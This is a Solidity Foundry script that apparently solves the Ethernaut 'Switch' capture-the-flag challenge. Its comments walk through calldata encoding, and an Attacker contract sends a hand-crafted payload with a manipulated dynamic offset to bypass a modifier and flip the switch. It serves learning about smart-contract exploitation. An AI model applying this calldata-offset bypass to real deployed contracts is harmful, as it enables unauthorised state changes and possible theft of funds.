// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Switch} from "../src/Switch.sol";

/**
 * Solution
 * 
 * Part 1
 * 
 * Q: What does CALLDATACOPY opcode do?
 * CALLDATACOPY copies a specified portion of the calldata (the input data to a contract call) into memory
 * CALLDATACOPY has three arguments (dstOst, ost, size)
 * "dstOst" -> selector - the offset in memory where the copied data will be stored
 * "offset" -> 68 - starting from which byte in calldata
 * "size" -> 4 - byte length to copy
 * 
 * =====================================================================================
 * Part 2 
 * 
 * The key to completing this challange is to understand how the dynamic values are structured in calldata
 * There are static and dynamic types of data.
 * static -> uint256 a (we know the time at compile time)
 * dynamic -> bytes memory a (the size cannot be determined at compile  time)
 * 
 * Dynamic part has two parts "offset" and "data"
 * 
 * =====================================================================================
 * Part 3
 * 
 * The calldata layout
 * 0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000
 * 
 * Let's break it down.
 * 30c13ade -> selector - flipSwitch() first four bytes
 * 0000000000000000000000000000000000000000000000000000000000000020 -> offest - location of the data. 20 hex is 32 dec, which means the data will start in 32 bytes
 * 0000000000000000000000000000000000000000000000000000000000000004 -> data size
 * 20606e1500000000000000000000000000000000000000000000000000000000 -> the actual input data - selector of turnSwitchOff
 * 
 * Passing the 0x20606e15 selector will only bypass the modifier but it won't enter turnSwitchOn.
 * So lets' go to Part 4
 * 
 * =====================================================================================
 * Part 4 
 * 
 * We need to modify our calldata to call the turnSwitchOn() but also to keep the logic witb bypassing the modifier.
 * The modified calldata looks like this:
 * 
 * 30c13ade -> selector - flipSwitch() first four bytes
 * 0000000000000000000000000000000000000000000000000000000000000060 -> the offset must be change to start from 0x76227e12
 * 0000000000000000000000000000000000000000000000000000000000000004 -> data size
 * 20606e1500000000000000000000000000000000000000000000000000000000 -> selector of turnSwitchOff starting at byte 68
 * 0000000000000000000000000000000000000000000000000000000000000004 -> the size of the data field
 * 76227e1200000000000000000000000000000000000000000000000000000000 -> selector of turnSwitchOn
 * 
 * Resources:
 * https://veridelisi.medium.com/learn-evm-opcodes-v-a59dc7cbf9c9
 * https://blog.openzeppelin.com/ethereum-in-depth-part-2-6339cf6bddb9
 */

contract Attacker {
    Switch switchContract;
    constructor(address _target) {
        switchContract = Switch(_target);
        bytes memory callData =
                    hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
        (bool success, ) = address(switchContract).call(callData);
        require(success, "failed txn");
    }
}

contract SwitchScript is Script {

    function run() public {
        Switch switchContract = Switch(address(0x4373429456BeeF9d24f2fD82A28f0Ed92af861A7));
        console.log("switchOn before", switchContract.switchOn());
        new Attacker(address(switchContract));
        require(switchContract.switchOn(), "challange not completed");
        console.log("switchOn after", switchContract.switchOn());
    }

}